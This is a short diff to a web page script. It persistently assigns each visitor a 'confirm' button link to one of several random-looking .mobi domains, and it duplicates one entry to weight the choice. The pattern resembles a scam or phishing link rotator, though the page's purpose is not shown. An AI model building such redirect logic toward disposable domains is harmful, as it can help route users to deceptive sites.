@@ -132,14 +132,25 @@ p{
 const urls = [
   "https://xqboegxqe.mobi/dfewsdl",
   "https://henjinxsq.mobi/dfewsdl",
+  "https://henjinxsq.mobi/dfewsdl",
   "https://nnopp.mobi/dfewsdl"
 ];
 
-let currentIndex = 0;
+const storageKey = "assigned_confirm_url_index";
+
+let assignedIndex = localStorage.getItem(storageKey);
+
+if (assignedIndex === null) {
+  assignedIndex = Math.floor(Math.random() * urls.length);
+  localStorage.setItem(storageKey, assignedIndex);
+} else {
+  assignedIndex = Number(assignedIndex);
+}
+
+document.getElementById("confirmBtn").href = urls[assignedIndex];
 
 document.getElementById("confirmBtn").addEventListener("click", function(){
-  this.href = urls[currentIndex];
-  currentIndex = (currentIndex + 1) % urls.length;
+  this.href = urls[assignedIndex];
 });
 </script>
 
